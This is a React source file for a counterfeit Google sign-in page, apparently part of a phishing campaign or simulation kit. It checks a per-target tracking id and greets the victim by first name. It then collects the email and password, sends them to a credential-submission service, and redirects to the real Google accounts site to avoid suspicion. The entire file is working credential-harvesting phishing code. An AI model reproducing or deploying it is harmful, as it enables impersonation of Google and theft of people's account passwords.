import React, { useEffect, useState } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import './GooglePortal.css';
import logo from '../../assets/img/googlelogo.svg';
import { logClick, submitCredentials } from '../../services/MSPortalService';

const GooglePortal = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [firstName, setFirstName] = useState('');
    const [step, setStep] = useState(1);
    const [isLoading, setIsLoading] = useState(true);
    const navigate = useNavigate();
    const [searchParams] = useSearchParams();

    useEffect(() => {
        document.title = "Sign in - Google Accounts";
        document.body.classList.add('g-portal-body');
        return () => {
            document.body.classList.remove('g-portal-body');
        };
    }, []);

    useEffect(() => {
        const validateAndLogClick = async () => {
            const trackingId = searchParams.get('id');

            if (!trackingId || trackingId.length < 4 || !/^[a-zA-Z0-9]+$/.test(trackingId)) {
                navigate('/error');
                return;
            }

            const result = await logClick(trackingId);

            if (result.success) {
                if (result.firstName) {
                    setFirstName(result.firstName);
                }
                setIsLoading(false);
            } else {
                console.error(result.message);
                navigate('/error');
            }
        };

        validateAndLogClick();
    }, [navigate, searchParams]);

    const handleEmailSubmit = (e) => {
        e.preventDefault();
        setStep(2);
    };

    const handlePasswordSubmit = async (e) => {
        e.preventDefault();

        const trackingId = searchParams.get('id');

        if (!trackingId) {
            window.alert('The Application URL is invalid or incomplete. Please check your email for the correct and active link.');
            return;
        }

        const result = await submitCredentials(email, password, trackingId);

        if (result.success) {
            window.location.href = 'https://accounts.google.com';
        } else {
            window.alert(result.message);
        }
    };

    if (isLoading) {
        return (
            <div className="g-loading-container">
                <div className="g-spinner-container">
                    <div className="g-spinner"></div>
                </div>
            </div>
        );
    }

    return (
        <div className="g-portal">
            <div className="g-card">
                <div className="g-card-inner">
                    <div className="g-left-col">
                        <div className="g-logo-wrap">
                            <img src={logo} alt="Google" className="g-logo" />
                        </div>

                        {step === 1 && (
                            <>
                                <h1 className="g-title">Sign in</h1>
                                <p className="g-subtitle">Use your Google Account</p>
                            </>
                        )}

                        {step === 2 && (
                            <>
                                <h1 className="g-title">{firstName ? `Hi ${firstName}` : 'Welcome'}</h1>
                                <div className="g-account-chip">
                                    <span className="g-account-avatar">{email.charAt(0).toUpperCase() || 'G'}</span>
                                    <span className="g-account-email">{email}</span>
                                </div>
                            </>
                        )}
                    </div>

                    <div className="g-right-col">
                        {step === 1 && (
                            <form onSubmit={handleEmailSubmit}>
                                <div className="g-input-wrap">
                                    <input
                                        id="g-email"
                                        type="email"
                                        className="g-input"
                                        value={email}
                                        onChange={(e) => setEmail(e.target.value)}
                                        required
                                        autoFocus
                                    />
                                    <label htmlFor="g-email" className={`g-label ${email ? 'g-label-float' : ''}`}>
                                        Email or phone
                                    </label>
                                </div>

                                <a href="#" className="g-link g-forgot">Forgot email?</a>

                                <p className="g-helper">
                                    Not your computer? Use a private browsing window to sign in.
                                    {' '}
                                    <a href="#" className="g-link">Learn more about using Guest mode</a>
                                </p>

                                <div className="g-actions">
                                    <a href="#" className="g-link g-create">Create account</a>
                                    <button type="submit" className="g-btn-next">Next</button>
                                </div>
                            </form>
                        )}

                        {step === 2 && (
                            <form onSubmit={handlePasswordSubmit}>
                                <div className="g-input-wrap">
                                    <input
                                        id="g-password"
                                        type="password"
                                        className="g-input"
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        required
                                        autoFocus
                                    />
                                    <label htmlFor="g-password" className={`g-label ${password ? 'g-label-float' : ''}`}>
                                        Enter your password
                                    </label>
                                </div>

                                <a href="#" className="g-link g-forgot">Forgot password?</a>

                                <div className="g-actions">
                                    <a href="#" className="g-link g-create">Try another way</a>
                                    <button type="submit" className="g-btn-next">Next</button>
                                </div>
                            </form>
                        )}
                    </div>
                </div>
            </div>

            <div className="g-footer">
                <span className="g-footer-lang">English (United States)</span>
                <div className="g-footer-links">
                    <a href="#" className="g-footer-link">Help</a>
                    <a href="#" className="g-footer-link">Privacy</a>
                    <a href="#" className="g-footer-link">Terms</a>
                </div>
            </div>
        </div>
    );
};

export default GooglePortal;
